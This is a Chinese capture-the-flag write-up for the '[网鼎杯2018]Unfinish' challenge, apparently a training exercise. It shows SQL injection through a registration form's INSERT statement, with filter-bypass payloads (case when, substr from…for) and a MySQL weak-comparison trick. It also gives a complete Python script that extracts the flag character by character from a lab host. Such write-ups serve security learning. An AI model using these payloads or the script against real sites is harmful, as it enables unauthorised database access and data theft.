# \[网鼎杯2018]Unfinish

## \[网鼎杯2018]Unfinish

## 考点

* insert中的盲注
* MySQL的弱比较

## wp

扫描存在register.php，随便注册登录进去是一张图片。有注册也有登录，可以试试注入

在注册处用户名填`\'select-`，发现返回的用户名是`'select-`

如果注册处用户名是`1234"`，会302跳转，如果是`1234'`就还会是注册页面，这说明是用`'`闭合语句的。并且如果语句执行失败会是注册页面。

![](.gitbook/assets/image\_rc8BLEiHfGofkRf4RiBrnr.png)

可以猜出来后端代码

```sql
insert into table (id,email,name,pass) values (1,'123@qq.com','123','123')
select name from table where email='123@qq.com'
```

传入`0'or 0 or '0`，name返回的是0。传入`0'or 1 or '0`返回的是1。

先构造insert的报错注入，`' or updatexml(1,concat(0x7e,database()),0) or '`，结果返回`nnnnoooo!!!`

![](.gitbook/assets/image\_eXk5YwzymYzxjmDKfgmBwj.png)

经过一番尝试，发现是过滤了`,`，那就不能用if语句盲注，可以用`case when`

payload

```sql
0'or (select case ascii(substr(database() from 1 for 1)) when 119 then 1 else 0 end) or '0
```

用ASCII码逐个爆破即可，可以得到数据库`web`，但是这里ban了`information`

```sql
import re
import string
import requests
import time

table = string.digits+string.ascii_letters+'_{}-'


flag = ''
for i in range(1,50):
    for j in table:
        # 防止请求次数太多
        time.sleep(0.3)
        paylaod = f"0'or (select case ascii(substr((select * from flag) from {str(i)} for 1)) when {ord(j)} then 1 else 0 end) or '0"
        
        name = str(time.time())
        data = {
          'email': f'1234567890{name}@qq.com',
          'username': paylaod,
          'password': '123'
        }
        
        response1 = requests.post('http://3b088f53-2ed9-4a06-b297-024436308dbb.node4.buuoj.cn:81/register.php',data=data)
        
        data_log = {
          'email': f'1234567890{name}@qq.com',
          'password': '123'
        }
        
        response2 = requests.post('http://3b088f53-2ed9-4a06-b297-024436308dbb.node4.buuoj.cn:81/login.php',data=data_log)
        
        try:
            # re.DOTALL匹配包括回车在内的所有字符
            t = re.search('<span class="user-name">.*</span>',response2.text,re.DOTALL)
            tt=re.search('\d+',t.group())
        
            if tt.group()=='1':
                flag = flag + j
                print(flag)
                break
            else:
                pass
        except:
            continue
```

还有一种方法是用sql的弱比较，会把`'0'+119+'0'`这种做加法运算，payload如下

`0'+ascii(substr(database() from 1 for 1))+'0`。这会在name处回显查询的值

![](.gitbook/assets/image\_nYgUtF4c3KCzfNNbPLAu9E.png)

## 小结

1. insert语句中可以使用`0'or 0 or '0`根据返回结果判断盲注是否存在
2. 在substr函数的`,`被过滤时，可以使用`from 1 for 1`
3. 在if被过滤时，可以使用case when。`0'or (select case ascii(substr(database() from 1 for 1)) when 119 then 1 else 0 end) or '0`
4. MySQL存在弱比较，会把`'0'+119+'0'`做加法运算。`0'+ascii(substr(database() from 1 for 1))+'0`
